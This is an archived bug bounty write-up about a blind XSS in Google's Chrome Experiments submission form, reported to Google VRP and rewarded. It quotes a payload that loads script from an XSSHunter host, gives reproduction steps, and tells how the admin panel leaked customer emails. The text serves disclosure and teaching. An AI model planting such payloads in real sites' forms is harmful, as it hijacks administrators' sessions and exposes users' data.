---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-08-03_blind-xss-in-chrome-experiments-google-write-up.md
original_filename: 2018-08-03_blind-xss-in-chrome-experiments-google-write-up.md
title: Blind-XSS in Chrome Experiments - Google (Write Up)
category: documents
detected_topics:
- xss
- command-injection
- information-disclosure
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- information-disclosure
- api-security
- cloud-security
language: en
raw_sha256: cad42c34f47a295bf82eb3cda7c038325c122140a1ef58803cad156bbd894d24
text_sha256: d8867d0dc618dc69b63dc64a92c61b19026b9812f3e70505c6bf3f062ca1e1cc
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Blind-XSS in Chrome Experiments - Google (Write Up)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-08-03_blind-xss-in-chrome-experiments-google-write-up.md
- Source Type: markdown
- Detected Topics: xss, command-injection, information-disclosure, api-security, cloud-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `cad42c34f47a295bf82eb3cda7c038325c122140a1ef58803cad156bbd894d24`
- Text SHA256: `d8867d0dc618dc69b63dc64a92c61b19026b9812f3e70505c6bf3f062ca1e1cc`


## Content

---
title: "Blind-XSS in Chrome Experiments - Google (Write Up)"
page_title: "Evan Ricafort | Blog: Blind-XSS in Chrome Experiments - Google (Write Up)"
url: "https://blog.evanricafort.com/2018/08/blind-xss-in-chrome-experiments-google.html"
final_url: "https://blog.evanricafort.com/2018/08/blind-xss-in-chrome-experiments-google.html"
authors: ["Evan Ricafort (@evanricafort)"]
programs: ["Google"]
bugs: ["Blind XSS"]
publication_date: "2018-08-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5774
---

Hello Everyone,  
  
  
In this article, I will show you how I found a blind-XSS vulnerability that leads into Information Disclosure in one of Google's owned product which is the Chrome Experiments (_https://experiments.withgoogle.com/chrome_)  
  
  
Back in June last year while looking for Google bug bounty related write up, I found a video proof of concept on youtube about a Cross Site Scripting vulnerability on one of the Google owned product, the Chrome Experiments (_https://chromeexperiments.com_). on the description of his video PoC, he didn't mention if the bug was awarded or not so I decided to hunt on the same domain. I fired up my sublist3r just to check if there's any interesting subdomains and found an interesting one which is _http://workshop.chromeexperiments.com/_. On the subdomain, I found a Cross Site Scripting vulnerability and reported it to the Google VRP which ends up getting duplicate.  
  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivioHkvC7Hsg7dTOjAfz2xzhQvyKtDOBP6i8JrlD24aBvJ7OX5cDRCeEqM54DbGEDRSY7aTX0PFd70ZTorK2adKl7Scfwrikam7InRygAgkogudKDsYFghAtGjFcjG-O51zqCvMT-J/s640/Screenshot_1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivioHkvC7Hsg7dTOjAfz2xzhQvyKtDOBP6i8JrlD24aBvJ7OX5cDRCeEqM54DbGEDRSY7aTX0PFd70ZTorK2adKl7Scfwrikam7InRygAgkogudKDsYFghAtGjFcjG-O51zqCvMT-J/s1600/Screenshot_1.png)  
---  
XSS in http://workshop.chromeexperiments.com [Duplicate]  
  
  
  
So long story short, I found a blind-XSS on _https://experiments.withgoogle.com/_ which is also related to _http://workshop.chromeexperiments.com/_. on the new target, I found an interesting page which is _https://experiments.withgoogle.com/submit_. On my first test, I tried to look up for some XSS and nothing was found. after a few minutes of testing, I decided to fire up my XSSHunter account to test for a blind-XSS, on the new target page, I fill up the form with some blind-XSS payload and submitted it to the server but I didn't receive any successful email about my payload 'til the next few weeks since I submitted. but fortunately, On the 30th of August, few months later after I submitted my payload. I received an email from XSSHunter saying that one of my payload fired up!  
  
  
  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaJyS9ur4nWJbNN1ZLFYh-2YZ9e7HlouMfw99sAX5TPQmSGCdPO2nT6a4GLY7w6rloGywk8NtLvWUgkFJbuPyGNvg-LaEZSKgFyMXscbesNYO3nbWWfSWGILylqttE9ZBc_xySleWX/s640/Screenshot_2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaJyS9ur4nWJbNN1ZLFYh-2YZ9e7HlouMfw99sAX5TPQmSGCdPO2nT6a4GLY7w6rloGywk8NtLvWUgkFJbuPyGNvg-LaEZSKgFyMXscbesNYO3nbWWfSWGILylqttE9ZBc_xySleWX/s1600/Screenshot_2.png)  
---  
  
  
  
But at first place, the XSSHunter email is very confusing since it didn't even give me any hint where it came from but after a few hours of investigation, I found a hint on the param "DOM" on XSSHunter logs. I noticed that XSSHunter throws some interesting information from the Chrome Experiments. Hundreds of personal emails and private messages from the customers and I also found my test submission on the logs, that's where I remember what target page I submitted my blind-XSS payload.  
  
  
So below is the Proof of Concept I submitted to Google Security Team.  
  
  

> _Report details:  
>  
>  ID: 5-64xxxxxxxxxxx  
>  Reporter: [[email protected]](/cdn-cgi/l/email-protection)  
>  
>  1\. Goto https://xsshunter.com/app and register  
>  2\. Goto https://experiments.withgoogle.com/submit  
>  3\. In the "Submit your experiment" form, input your blind XSS payload. my payload was ("><script src=https://<redacted>.xss.ht></script>)  
>  4\. Click Submit.  
>  
>  If the admin of https://experiments.withgoogle.com/ will open the admin panel to check the submissions, the blind XSS payload will fire on and you will received an email from XSSHunter that your payload fired on https://experiments.withgoogle.com/.  
>  
>  
>  
>  Attack scenario:  
>  This issue is not just blind-XSS. in the logs that was emailed to me from XSSHunter, it leaks some hundreds of different email addresses from the Chrome Experiments customers who submitted to them.  
>  
>  Check this link for the logs that was emailed to me from XSSHunter about the Chrome Experiments: http://<redacted>/chromeexperimentspoc.html  
>  
>  In the logs, there some email address leak from the Chrome Experiments customers which results to Information Disclosure.  
>  
>  PS: it took me a months before I received an email from XSSHunter that my payload from Chrome Experiments fired on their side, because maybe the admin from Chrome Experiments logged in to the admin panel of the chrome experiments the other day and opens the submission page.  
>  
>  I hope you understand  
>  
>  Cheers,  
>  Evan_

  
  
  
  
  
\--Timeline--  
  
Reported: _Friday, September 1, 2017 at 1:27 AM_  
Triaged: _Friday, September 1, 2017 at 6:52 PM_  
Nice Catch: _Monday, September 4, 2017 at 9:04 PM_  
Awarded: _Thursday, September 7, 2017 at 1:17 AM ($100)_  
Fixed: ----  
  
Shoutout to [@IAmMandatory](https://twitter.com/IAmMandatory) for the awesome XSSHunter tool.  
  
  
I hope you enjoy this short story and write up.  
  
  

> **_"The biggest adventure you can take is to live the life of your dreams"_**

> _~Oprah Winfrey_
